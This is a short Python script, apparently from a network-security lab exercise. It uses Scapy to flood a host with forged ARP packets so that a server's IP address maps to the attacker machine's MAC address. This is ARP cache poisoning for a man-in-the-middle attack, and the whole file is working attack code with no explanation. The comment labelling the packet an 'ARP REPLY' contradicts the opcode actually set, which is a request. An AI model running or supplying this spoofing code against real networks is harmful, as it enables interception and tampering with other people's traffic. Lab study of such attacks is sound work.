#! /usr/bin/env python
from scapy.all import *

# Machine A:
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine Server2:
IP_B = "10.0.2.7"
MAC_B = "02:42:da:b1:c3:ed"  

# Machine M:
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"

print("SENDING SPOOFED ARP REPLY")
ether = Ether(dst=MAC_A)
arp = ARP()
arp.psrc = IP_B
arp.hwsrc = MAC_M
arp.pdst = IP_A
arp.op = 1  # ARP REPLY
frame = ether / arp

if __name__ == "__main__":
    while True:
        sendp(frame, verbose=0)

